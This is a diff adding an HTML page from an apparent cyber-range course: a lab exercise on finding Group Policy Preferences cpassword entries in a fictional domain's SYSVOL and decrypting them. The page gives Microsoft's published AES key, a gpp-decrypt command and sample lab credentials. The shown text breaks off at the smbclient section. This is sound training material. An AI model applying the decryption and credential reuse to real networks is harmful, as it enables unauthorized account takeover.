@@ -1,0 +1,1593 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Web application penetration testing exercises for OpenCyberRange">
+      
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.2">
+    
+    
+      
+        <title>Exercise 2.2: SYSVOL Skeletons - Web Application Penetration Testing</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css?v=4">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="pink">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#exercise-22-sysvol-skeletons" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Web Application Penetration Testing" class="md-header__button md-logo" aria-label="Web Application Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Web Application Penetration Testing
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Exercise 2.2: SYSVOL Skeletons
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="pink"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="pink"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Web Application Penetration Testing" class="md-nav__button md-logo" aria-label="Web Application Penetration Testing" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Web Application Penetration Testing
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH W1 -- Web Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH W1 -- Web Reconnaissance
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/01_Basic_Directory_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.1 -- Basic Directory Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/02_Technology_Identification/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.2 -- Technology Identification
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/03_HTTP_Methods_Enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.3 -- HTTP Methods Enumeration
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/04_Header_Analysis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.4 -- Header Analysis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/05_Subdomain_Discovery/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.5 -- Subdomain Discovery
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/06_Comprehensive_Web_Reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W1.6 -- Comprehensive Web Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB01_Web_Reconnaissance/07_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CH W2 -- Web Exploitation
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CH W2 -- Web Exploitation
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB02_Web_Exploitation/00_Introduction/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Introduction
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB02_Web_Exploitation/01_Basic_SQL_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exercise W2.1 -- Basic SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CH_WEB02_Web_Exploitation/02_Chapter_Review/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Chapter Review
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-begin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before You Begin
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Scenario
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#your-objectives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Your Objectives
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Your Objectives">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-sysvol-looks-like-on-disk" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What SYSVOL Looks Like on Disk
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cpassword-decryption-pipeline" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        cpassword Decryption Pipeline
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#background-gpp-cpassword-and-the-public-aes-key" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Background: GPP, cpassword, and the Public AES Key
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Background: GPP, cpassword, and the Public AES Key">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-published-key" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The published key
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-xml-files-that-may-contain-cpassword" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The XML files that may contain cpassword
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-patch-and-what-it-did-not-do" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The patch and what it did not do
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tool-primer" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tool Primer
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Tool Primer">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gpp-decrypt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        gpp-decrypt
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#smbclient-mass-download-of-sysvol" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        smbclient mass-download of SYSVOL
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#grep-find-for-sysvol-inspection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        grep + find for SYSVOL inspection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#manual-openssl-decryption-if-gpp-decrypt-is-missing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Manual openssl decryption (if gpp-decrypt is missing)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#walkthrough" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Walkthrough
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Walkthrough">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-confirm-your-scope-token" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 1: Confirm Your Scope Token
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-mirror-sysvol-locally" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 2: Mirror SYSVOL Locally
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-hunt-for-cpassword" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 3: Hunt for cpassword
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-4-filter-to-your-token" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 4: Filter to Your Token
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-5-decrypt" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 5: Decrypt
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-6-authenticate-as-the-recovered-account" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 6: Authenticate as the Recovered Account
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-7-read-the-token-scoped-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Step 7: Read the Token-Scoped Flag
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blue-team-perspective" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blue Team Perspective
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hardening-note" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Hardening Note
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Hardening Note">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#record-your-findings" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Record Your Findings
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#analysis-questions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Analysis Questions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#key-takeaways" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Key Takeaways
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cheat-sheet-recap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cheat Sheet Recap
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#spaced-repetition" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Spaced Repetition
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="exercise-22-sysvol-skeletons">Exercise 2.2: SYSVOL Skeletons</h1>
+<h2 id="before-you-begin">Before You Begin</h2>
+<p>In 2014 Microsoft released MS14-025, which removed the ability for Group Policy Preferences (GPP) to deploy local credentials with a <code>cpassword</code> attribute. The patch did <strong>not</strong> remove or rewrite the <code>cpassword</code> entries that already lived in SYSVOL. SYSVOL replicates to every domain controller, every DC backs it up, every backup ages into archives. Twelve years later you still find decryptable GPP <code>cpassword</code> blobs in production directories. Exercise 2.2 walks you through finding one in Nordport's SYSVOL, decrypting it with the published Microsoft AES key, and using the recovered credential.</p>
+<p><strong>Tools required:</strong> <code>smbclient</code>, <code>gpp-decrypt</code>, <code>openssl</code> (fallback decryption), <code>netexec</code>. All are pre-installed on Kali.</p>
+<h2 id="scenario">Scenario</h2>
+<p>Marcus Bell: "MS14-025 patched the creation of new GPP cpassword entries twelve years ago. It did not delete the old ones. SYSVOL is replicated to every DC, so every leak persists forever unless someone goes looking. Find Nordport's. Decrypt it. The recovered credential is yours."</p>
+<p>Your scope token (<code>OCR_SCOPE_TOKEN</code>) tells you which one of the per-token GPP entries belongs to you. Decrypting it yields the password for <code>svc_gpp_&lt;token&gt;</code>. That account has read access to a per-token directory under the <code>\\corp-dc01\GPPFlags\</code> share. The flag lives in <code>FLAG.txt</code> inside your directory.</p>
+<p><strong>Credentials:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>j.chen</code></td>
+<td><code>Welcome2026#</code></td>
+<td>Read SYSVOL</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Domain:</strong> <code>corp.nordport.local</code>
+<strong>Domain controller:</strong> <code>corp-dc01</code></p>
+<h2 id="your-objectives">Your Objectives</h2>
+<ul>
+<li>Mount and recursively download SYSVOL with <code>j.chen</code> credentials</li>
+<li>Locate a Group Policy Preferences XML file containing <code>cpassword</code></li>
+<li>Decrypt the per-token <code>cpassword</code> for your account</li>
+<li>Authenticate as <code>svc_gpp_&lt;token&gt;</code> with the recovered password</li>
+<li>Read <code>\\corp-dc01\GPPFlags\&lt;token&gt;\FLAG.txt</code> and submit the flag</li>
+</ul>
+<h3 id="what-sysvol-looks-like-on-disk">What SYSVOL Looks Like on Disk</h3>
+<p>SYSVOL is a single replicated share, but its tree has a fixed shape. Knowing the shape means you grep the right path the first time. The diagram below mirrors the layout you will see on Nordport.</p>
+<pre class="mermaid"><code>flowchart TD
+    SYSVOL["\\\\corp-dc01\\SYSVOL"]
+    Domain["corp.nordport.local"]
+    Pol["Policies"]
+    Scripts["scripts (NETLOGON)"]
+    GUID["{31B2F340-...} (Default Domain Policy)"]
+    Mach["Machine\\Preferences"]
+    Groups["Groups\\Groups.xml&lt;br/&gt;(cpassword candidate)"]
+    Sched["ScheduledTasks\\ScheduledTasks.xml"]
+    Drives["Drives\\Drives.xml"]
+    Svc["Services\\Services.xml"]
+
+    SYSVOL --&gt; Domain
+    Domain --&gt; Pol
+    Domain --&gt; Scripts
+    Pol --&gt; GUID
+    GUID --&gt; Mach
+    Mach --&gt; Groups
+    Mach --&gt; Sched
+    Mach --&gt; Drives
+    Mach --&gt; Svc</code></pre>
+<h3 id="cpassword-decryption-pipeline">cpassword Decryption Pipeline</h3>
+<p>The decryption is mechanical once you have the ciphertext. The diagram below traces a single cpassword from XML attribute to plaintext.</p>
+<pre class="mermaid"><code>flowchart LR
+    A["cpassword='j1Uyj3Vx...'&lt;br/&gt;(base64, no '=' padding)"]
+    B["Restore '=' padding&lt;br/&gt;to length % 4 == 0"]
+    C["base64 decode&lt;br/&gt;raw ciphertext bytes"]
+    D["AES-256-CBC decrypt&lt;br/&gt;key=4e9906e8...&lt;br/&gt;IV=16x 0x00"]
+    E["Strip PKCS7 padding"]
+    F["UTF-16 LE decode"]
+    G["plaintext password"]
+
+    A --&gt; B --&gt; C --&gt; D --&gt; E --&gt; F --&gt; G</code></pre>
+<hr />
+<h2 id="background-gpp-cpassword-and-the-public-aes-key">Background: GPP, cpassword, and the Public AES Key</h2>
+<p>Group Policy Preferences (GPP) extended Group Policy in Windows Server 2008 with a way for administrators to deploy local users, scheduled tasks, mapped drives, services, and data sources to client machines. To support credential deployment (such as creating a local administrator account with a fixed password on every workstation), GPP introduced an XML schema that included an encrypted <code>cpassword</code> attribute.</p>
+<p>The encryption was AES-256 in CBC mode, with an all-zero IV, and a key that Microsoft <strong>published in their own MSDN documentation</strong> as a reference for compatibility. The intent was that the encryption obfuscated the password from casual filesystem readers; in practice anyone who read MSDN could decrypt it.</p>
+<h3 id="the-published-key">The published key</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
+</code></pre></div>
+<p>The 32-byte AES-256 key (IV is 16 zero bytes). The plaintext is the password encoded as UTF-16 LE. The ciphertext is base64-encoded with optional trailing <code>=</code> padding stripped.</p>
+<h3 id="the-xml-files-that-may-contain-cpassword">The XML files that may contain cpassword</h3>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Groups.xml</code></td>
+<td>Local user / group deployment</td>
+</tr>
+<tr>
+<td><code>Services.xml</code></td>
+<td>Service account definition</td>
+</tr>
+<tr>
+<td><code>ScheduledTasks.xml</code></td>
+<td>Scheduled task credential</td>
+</tr>
+<tr>
+<td><code>DataSources.xml</code></td>
+<td>ODBC connection string credential</td>
+</tr>
+<tr>
+<td><code>Drives.xml</code></td>
+<td>Mapped drive credential</td>
+</tr>
+<tr>
+<td><code>Printers.xml</code></td>
+<td>Printer share credential</td>
+</tr>
+</tbody>
+</table>
+<p>Any of these may contain a <code>cpassword="..."</code> attribute. They live under <code>\\&lt;domain&gt;\SYSVOL\&lt;domain&gt;\Policies\&lt;GUID&gt;\Machine\Preferences\&lt;Type&gt;\</code>.</p>
+<h3 id="the-patch-and-what-it-did-not-do">The patch and what it did not do</h3>
+<p>MS14-025 removed the GUI affordances that let administrators create new <code>cpassword</code> entries through <code>gpedit.msc</code>. Existing entries continue to work because client-side processing of GPP is unchanged. Microsoft's official guidance is to manually delete every <code>cpassword</code>-bearing XML from SYSVOL after rotating the leaked passwords. Most organizations did the rotation; very few did the deletion. The artifact is consequently one of the most reliable findings in any internal pentest of an AD older than ~2014.</p>
+<hr />
+<h2 id="tool-primer">Tool Primer</h2>
+<h3 id="gpp-decrypt">gpp-decrypt</h3>
+<p>A Ruby one-liner shipped on Kali that does AES-256 CBC decryption with the published key.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>gpp-decrypt<span class="w"> </span><span class="s1">&#39;j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw&#39;</span>
+</code></pre></div>
+<p>Output is the plaintext password.</p>
+<h3 id="smbclient-mass-download-of-sysvol">smbclient mass-download of SYSVOL</h3>
